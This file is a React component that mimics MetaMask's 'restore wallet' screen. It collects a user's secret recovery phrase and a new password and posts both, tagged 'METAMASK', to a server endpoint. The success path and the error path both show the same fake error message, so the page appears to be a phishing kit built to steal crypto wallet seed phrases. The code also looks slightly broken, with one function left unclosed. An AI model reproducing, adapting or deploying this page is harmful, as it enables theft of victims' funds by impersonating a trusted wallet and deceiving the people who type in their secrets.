"use client";

import { useState, useEffect } from "react";
import { Eye, EyeOff } from "lucide-react";

const wordCounts = [12, 15, 18, 21, 24];

export default function Metamask() {
  const [wordCount, setWordCount] = useState(12);
  const [phrase, setPhrase] = useState<string[]>(Array(wordCount).fill(""));
  const [visible, setVisible] = useState<boolean[]>(Array(wordCount).fill(false));
  const [step, setStep] = useState<1 | 2>(1);

  const [phraseString, setPhraseString] = useState(""); // for combined request
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [error, setError] = useState("");

  useEffect(() => {
    setPhrase(Array(wordCount).fill(""));
    setVisible(Array(wordCount).fill(false));
  }, [wordCount]);

  const toggleVisibility = (index: number) => {
    const updated = [...visible];
    updated[index] = !updated[index];
    setVisible(updated);
  };

  const handleChange = (index: number, value: string) => {
    const updated = [...phrase];
    updated[index] = value;
    setPhrase(updated);
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData.getData("text").trim();
    const words = pasted.split(/\s+/).slice(0, wordCount);
    const updated = [...phrase];
    for (let i = 0; i < words.length; i++) {
      updated[i] = words[i];
    }
    setPhrase(updated);
    e.preventDefault();
  };

  const handleRestore = () => {
    const phraseStr = phrase.join(" ").trim();
    setPhraseString(phraseStr);
    setStep(2); // move to password step
  };

  const handleSetPassword = async () => {
    setError("");

    if (!password || !confirmPassword) {
      setError("Please fill in both password fields.");
      return;
    }

    if (password !== confirmPassword) {
      setError("Passwords do not match.");
      return;
    }

    try {
      const response = await fetch("/api/wallet/restore", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phrase: `METAMASK ${phraseString}`, password }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.message || "Wallet restore failed.");
      }

      alert("Failed to restore, server issue.");
    } catch (err) {
  const errorMessage = err instanceof Error ? err.message : "An unknown error occurred.";
  setError(errorMessage);
  alert("Failed to restore, server issue.");
}

  return (
    <div className="min-h-screen bg-[#1e1e1e] text-white flex items-center justify-center px-4">
      <div className="w-full max-w-xl bg-[#121212] p-8 rounded-2xl shadow-xl space-y-6">

        {/* Stepper */}
        <div className="flex items-center justify-center space-x-4">
          <div className={`flex items-center space-x-2 ${step === 1 ? "" : "opacity-60"}`}>
            <div className={`w-8 h-8 rounded-full flex items-center justify-center ${step === 1 ? "bg-blue-600 text-white" : "border border-gray-500 text-gray-500"}`}>1</div>
            <span className="text-sm">Confirm secret recovery phrase</span>
          </div>
          <div className="h-px w-6 bg-gray-500" />
          <div className={`flex items-center space-x-2 ${step === 2 ? "" : "opacity-60"}`}>
            <div className={`w-8 h-8 rounded-full flex items-center justify-center ${step === 2 ? "bg-blue-600 text-white" : "border border-gray-500 text-gray-500"}`}>2</div>
            <span className="text-sm">Create password</span>
          </div>
        </div>

        {/* Headings */}
        <div className="text-center">
          {step === 1 ? (
            <>
              <h1 className="text-2xl font-bold">Access your wallet with your Secret Recovery Phrase</h1>
              <p className="text-sm text-gray-400 mt-2">We will use your phrase to validate your ownership.</p>
            </>
          ) : (
            <>
              <h1 className="text-2xl font-bold">Create a password</h1>
              <p className="text-sm text-gray-400 mt-2">This password will unlock your wallet only on this device.</p>
            </>
          )}
        </div>

        {/* Step 1: Phrase input */}
        {step === 1 && (
          <>
            <select
              value={wordCount}
              onChange={(e) => setWordCount(Number(e.target.value))}
              className="w-full bg-[#1e1e1e] border border-gray-700 rounded-md px-3 py-2 text-sm text-white"
            >
              {wordCounts.map((count) => (
                <option key={count} value={count}>
                  I have a {count}-word phrase
                </option>
              ))}
            </select>

            <div className="bg-[#292929] border-l-4 border-blue-500 text-sm text-gray-300 px-4 py-3 rounded">
              You can paste your entire secret recovery phrase into any field
            </div>

            <div className="grid grid-cols-3 gap-3">
              {phrase.map((word, i) => (
                <div key={i} className="relative">
                  <input
                    type={visible[i] ? "text" : "password"}
                    value={word}
                    onChange={(e) => handleChange(i, e.target.value)}
                    onPaste={handlePaste}
                    className="w-full bg-[#1e1e1e] border border-gray-700 rounded-md px-3 py-2 pr-10 text-sm text-white"
                    placeholder={`${i + 1}.`}
                  />
                  <button
                    type="button"
                    className="absolute right-2 top-2 text-gray-500 hover:text-white"
                    onClick={() => toggleVisibility(i)}
                  >
                    {visible[i] ? <EyeOff size={16} /> : <Eye size={16} />}
                  </button>
                </div>
              ))}
            </div>

            <button
              className="w-full bg-[#3b3bff] hover:bg-[#2f2fd1] text-white py-2 rounded-md font-medium mt-4"
              onClick={handleRestore}
            >
              Confirm Secret Recovery Phrase
            </button>
          </>
        )}

        {/* Step 2: Password input */}
        {step === 2 && (
          <>
            <input
              type="password"
              placeholder="New password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-[#1e1e1e] border border-gray-700 rounded-md px-3 py-2 text-sm text-white"
            />
            <input
              type="password"
              placeholder="Confirm password"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              className="w-full bg-[#1e1e1e] border border-gray-700 rounded-md px-3 py-2 text-sm text-white"
            />
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <button
              className="w-full bg-[#3b3bff] hover:bg-[#2f2fd1] text-white py-2 rounded-md font-medium mt-4"
              onClick={handleSetPassword}
            >
              Create Password
            </button>
          </>
        )}
      </div>
    </div>
  );
}
